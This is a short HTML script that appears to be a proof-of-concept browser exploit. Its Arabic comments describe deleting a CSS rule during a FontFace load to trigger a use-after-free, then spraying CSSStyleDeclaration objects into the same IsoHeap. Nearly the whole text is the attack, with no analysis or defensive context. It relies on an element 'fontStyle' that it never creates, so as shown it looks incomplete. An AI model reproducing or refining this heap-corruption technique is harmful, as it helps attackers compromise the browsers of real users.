<script>
    let sprayed = [];
    let styleElement = document.createElement('style');
    document.head.appendChild(styleElement);
    let sheet = styleElement.sheet;

    function triggerUAF() {
        let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
        document.fonts.add(font);

        Object.defineProperty(FontFace.prototype, 'then', {
            get() {
                // الحذف المباشر للـ Rule
                document.getElementById('fontStyle').sheet.deleteRule(0);
                
                // Spray سريع جداً باستخدام CSSStyleDeclaration
                // هذا النوع من الكائنات يشارك نفس IsoHeap الخاص بـ CSSFontFace
                for (let i = 0; i < 2000; i++) {
                    sheet.insertRule('.a' + i + '{color:red}', 0);
                    sprayed.push(sheet.cssRules[0].style);
                }
                return undefined;
            }
        });
        font.load();
    }

    setTimeout(triggerUAF, 1000);
</script>
